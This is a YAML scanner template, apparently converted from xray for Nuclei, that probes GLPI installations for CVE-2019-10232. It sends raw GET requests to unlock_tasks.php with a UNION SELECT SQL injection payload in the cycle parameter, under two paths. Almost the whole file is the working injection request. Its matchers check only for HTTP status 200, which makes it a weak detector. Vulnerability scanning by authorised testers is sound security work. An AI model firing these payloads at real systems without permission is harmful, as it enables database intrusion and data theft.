id: poc-yaml-teclib-glpl-cve-2019-10232

info:
  name: poc-yaml-teclib-glpl-cve-2019-10232
  author: 2husky
  severity: critical
  tags: xray-converted,cve-2019-10232,ct-35988
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-10232

http:
  - raw:
      - |
        GET /glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(md5({{rand_int(1000, 9999)}}))--%20&only_tasks=1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(md5({{rand_int(1000, 9999)}}))--%20&only_tasks=1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200